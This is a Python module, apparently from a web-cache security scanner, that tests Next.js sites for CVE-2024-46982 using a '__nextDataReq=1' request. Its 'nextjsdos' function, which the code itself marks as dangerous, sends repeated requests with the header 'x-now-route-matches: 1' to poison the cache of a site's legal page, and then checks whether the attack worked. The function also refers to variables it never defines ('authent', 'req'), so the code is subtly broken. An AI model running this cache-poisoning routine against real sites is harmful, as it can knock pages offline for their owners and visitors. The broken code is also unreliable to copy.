#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Based on Zhero research
https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir
"""

from modules.utils import requests, random, sys, configure_logger, re, Identify

logger = configure_logger(__name__)


from bs4 import BeautifulSoup
from urllib.parse import urljoin

COMMON_PATHS = [
    "mentions-legales", "mentions", "legal", "cgu", "terms", "conditions",
    "terms-of-service", "privacy", "politique-de-confidentialite"
]

def get_unrisk_page(base_url, response):
    soup = BeautifulSoup(response.text, "html.parser")

    for link in soup.find_all("a", href=True):
        href = link["href"].lower()
        if any(keyword in href for keyword in COMMON_PATHS):
            legal_url = urljoin(base_url, href)
            return legal_url

    for path in COMMON_PATHS:
        test_url = urljoin(base_url, "/" + path)
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                if re.search(r"mentions\s+legales|conditions\s+générales", response.text, re.IGNORECASE):
                    return test_url
        except requests.RequestException:
            continue

    return None


def nextjsdos(url, uri, s):
    #dangerous
    headers = {
    "x-now-route-matches": "1"
    }
    for _ in range(0, 5):
        reqdos = s.get(uri, headers=headers, verify=False, auth=authent, timeout=10, allow_redirects=False)
    reqverify = s.get(url, verify=False, auth=authent, timeout=10, allow_redirects=False)
    if "pageProps" in req.text or len(reqdos.content) == len(reqverify.content):
        print(f" {Identify.confirmed} | {url} | {headers}")


def datareq_check(url, s, req_main, custom_header, authent):

    uri = f"{url}?__nextDataReq=1"
    #print(uri)
    main_len = len(req_main.content)
    try:
        req = requests.get(uri, verify=False, auth=authent, headers=custom_header, timeout=10, allow_redirects=False)
        len_req = len(req.content)

        if "pageProps" in req.text or "__N_SSP" in req.text:
            print(f" {Identify.behavior} | CVE-2024-46982 | TAG OK | \033[34m{uri}\033[0m | PAYLOAD: x-now-route-matches: 1")
            unrisk_page = get_unrisk_page(url, req)
            if unrisk_page:
                uri = f"{unrisk_page}?__nextDataReq=1"
                nextjsdos(unrisk_page, uri, s)
        #elif len_req != main_len and req.status_code not in [403, 301, 302]:
            #print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | DIFF LENGTH | {uri} | {req.status_code}")
    except requests.Timeout:
        #print(f"request timeout {url} {p}")
        pass
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except Exception as e:
        #print(f"Error : {e}")
        logger.exception(e)
        pass